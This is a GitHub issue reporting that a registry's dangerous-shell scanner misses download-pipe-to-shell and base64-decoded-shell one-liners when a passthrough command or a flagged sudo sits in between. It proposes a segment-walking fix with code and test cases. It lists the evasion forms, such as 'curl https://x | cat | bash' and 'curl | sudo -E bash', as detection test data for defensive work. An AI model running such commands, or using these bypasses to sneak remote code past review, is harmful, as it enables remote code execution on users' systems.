  "issue_number": 1785,
  "issue_title": "Dangerous-shell scanner misses `pipe-to-shell` / `base64-decoded shell` when a benign passthrough or `sudo` flag sits between the source and the shell",
  "issue_body": "**Labels:** bug, safety, registry\n**Component:** `@heyclaude/registry` \u2014 dangerous shell pattern scanner\n**Affected file:** `packages/registry/src/command-safety.js` (`hasPipeToShellInstall` lines 70\u201386, `hasShellAfterPipe` lines 35\u201356, `hasBase64DecodedShell` lines 108\u2013126)\n\n## Summary\n\n`scanDangerousShellPatterns` flags remote-code-execution one-liners like `curl \u2026 | sh`. But the detector requires the shell to be the **immediate** command after the downloader's pipe: `hasPipeToShellInstall` sets `sawDownloaderBeforePipe` on `curl`/`wget` and, on the very next `|`, checks `hasShellAfterPipe`; if that pipe's next command isn't a shell it **resets the flag to `false`**. So inserting one no-op passthrough command \u2014 or a flagged `sudo` prefix \u2014 between the download and the shell silently defeats the check. The parallel `hasBase64DecodedShell` has the identical structure and the same gap.\n\nThese are trivial, well-known ways to write (or obfuscate) the exact pattern this scanner exists to surface, so the advisory signal is easy to bypass.\n\n## Reproduced (current behavior)\n\n```\n[\"pipe-to-shell install\"]   curl -fsSL https://example.com/install.sh | sh\n[\"pipe-to-shell install\"]   curl https://x | bash\n[\"pipe-to-shell install\"]   curl https://x | sudo bash\n[]                          curl https://x | sudo -E bash          \u2190 missed\n[]                          curl https://x | cat | bash            \u2190 missed\n[]                          curl https://x | tee /tmp/i.sh | bash  \u2190 missed\n[\"base64-decoded shell\"]    echo p | base64 -d | bash\n[]                          echo p | base64 -d | cat | bash        \u2190 missed\n```\n\n- `curl \u2026 | sudo -E bash` \u2014 `hasShellAfterPipe` skips exactly **one** `sudo` token (lines 39\u201345) and then expects a shell, so any `sudo` **flag** (`-E`, `--preserve-env`) \u2014 common in real installers \u2014 defeats it.\n- `curl \u2026 | cat | bash`, `curl \u2026 | tee file | bash`, `wget \u2026 | sed \u2026 | sh` \u2014 the downloader's output reaches the shell through a passthrough, but the flag was already reset at the intermediate pipe.\n\n## Expected behavior\n\nA download whose output reaches a shell **anywhere later in the same pipe chain** (through benign passthrough commands and/or a `sudo [flags]` privilege prefix) should be flagged as `pipe-to-shell install`; the base64 equivalent should be flagged as `base64-decoded shell`. Detection must **not** cross command separators (`;`, `&&`, `||`, `&`), so unrelated commands don't produce false positives.\n\n## Root cause\n\nBoth detectors model the pipeline as \"downloader, then *immediately* a shell\" with a single boolean that is cleared at every pipe. They don't walk the pipe chain, so any command between the source and the shell breaks the match. `hasShellAfterPipe` additionally only steps over a bare `sudo`, not `sudo` with flags.\n\n## Impact\n\n`scanDangerousShellPatterns` is the deterministic safety signal for submitted skill scripts, MCP commands, and install snippets (advisory triage for maintainer review). A signal that catches `curl | bash` but not `curl | cat | bash` or `curl | sudo -E bash` is trivially evaded, which is exactly the high-confidence remote-exec class the scanner is meant to surface. This is recall/correctness, not a sandbox \u2014 but a bypassable detector understates risk on precisely the submissions that matter.\n\n## Proposed fix\n\nWalk the line as a sequence of **pipe segments**, breaking the chain at command separators, and check each segment's **leading command** (after an optional `sudo [flags]` prefix). Flag when a downloader segment is followed by a shell segment in the same chain. This stays within the bounded, single-pass design from #1749 (no unbounded/backtracking regex), and checking each segment's *first* command avoids false positives like `\u2026 && cat in | sh`.\n\nSketch (replaces the boolean-reset loops in `hasPipeToShellInstall` and `hasBase64DecodedShell`, adds two small helpers; ~50\u201370 lines):\n\n```js\nconst SHELL_TOKENS = [\"bash\", \"zsh\", \"sh\"];\n\n// First command word of a pipe segment, stepping over a `sudo [flags]` prefix.\nfunction segmentLeadCommand(segment, lowerSegment) {\n  let i = 0;\n  while (/\\s/.test(segment[i] || \"\")) i += 1;\n  if (lowerSegment.startsWith(\"sudo\", i) && !isWordCharacter(segment[i + 4] || \"\")) {\n    i += 4;\n    for (;;) {\n      while (/\\s/.test(segment[i] || \"\")) i += 1;\n      if (segment[i] === \"-\") { while (segment[i] && !/\\s/.test(segment[i])) i += 1; }\n      else break;\n    }\n  }\n  let end = i;\n  while (isWordCharacter(segment[end] || \"\")) end += 1;\n  return lowerSegment.slice(i, end);\n}\n\n// Yields pipe segments, inserting a barrier at ; && || & so chains don't merge.\nfunction pipeSegments(line) { /* single linear pass, bounded */ }\n\nfunction hasPipeToShellInstall(line, lowerLine) {\n  let sawDownloader = false;\n  for (const seg of pipeSegments(line, lowerLine)) {\n    if (seg.barrier) { sawDownloader = false; continue; }\n    const lead = segmentLeadCommand(seg.raw, seg.lower);\n    if (sawDownloader && SHELL_TOKENS.includes(lead)) return true;\n    if (lead === \"curl\" || lead === \"wget\") sawDownloader = true;\n  }\n  return false;\n}\n```\n\n`hasBase64DecodedShell` reuses `pipeSegments`/`segmentLeadCommand`: track a segment whose lead is `base64` **with** a `-d`/`--decode` flag, then flag a later shell segment in the same chain.\n\n### Verified with the prototype\n\n```\ntrue   curl https://x | sh\ntrue   curl https://x | sudo -E bash\ntrue   curl https://x | cat | bash\ntrue   wget -qO- https://x | sed s/a/b/ | sh\nfalse  curl https://x | jq . | tee out && cat in | sh   (chain broken by &&)\nfalse  curl https://x | grep -v bash\nfalse  curl https://x | python; bash\nfalse  ls | cat\n```\n\n(All currently-detected direct forms stay detected; the four bypasses above flip to detected; the separator cases stay clean.)\n\n## Acceptance criteria / test plan\n\n`command-safety.js` is exercised by `tests/command-safety.test.ts`, which has no case for passthrough/`sudo`-flag pipelines (verified). Add:\n\n- [ ] `curl https://x | cat | bash`, `curl \u2026 | tee f | bash`, `wget \u2026 | sed \u2026 | sh` \u2192 include `\"pipe-to-shell install\"`.\n- [ ] `curl https://x | sudo -E bash` (and `sudo --preserve-env`) \u2192 flagged.\n- [ ] `echo p | base64 -d | cat | bash` \u2192 include `\"base64-decoded shell\"`.\n- [ ] No new false positives: `curl x | jq . && cat in | sh`, `curl x | grep -v bash`, `ls | cat`, `echo hi && bash` \u2192 not flagged.\n- [ ] Existing direct cases (`curl \u2026 | sh`, `curl \u2026 | sudo bash`, `echo \u2026 | base64 -d | bash`) stay flagged.\n\n## Notes for reviewers\n\n- Verified against `main`: the bypass outputs above are the actual scanner results; the bounded segment-walk fix reproduces correct results for all of them.\n- Stays consistent with #1749 (\"avoid unbounded shell scan regexes\") \u2014 the fix is a single linear pass over the line with no backtracking regex, so it keeps reviewer-side validation responsive on long lines.\n- Searched open/closed issues and PRs on `JSONbored/awesome-claude` \u2014 no existing report of a detection-bypass; #1749 was a performance/ReDoS hardening of the same file, not a recall fix. Distinct from previously filed issues (atob, notifications truncate, seo k-suffix, keyword normalization).\n",
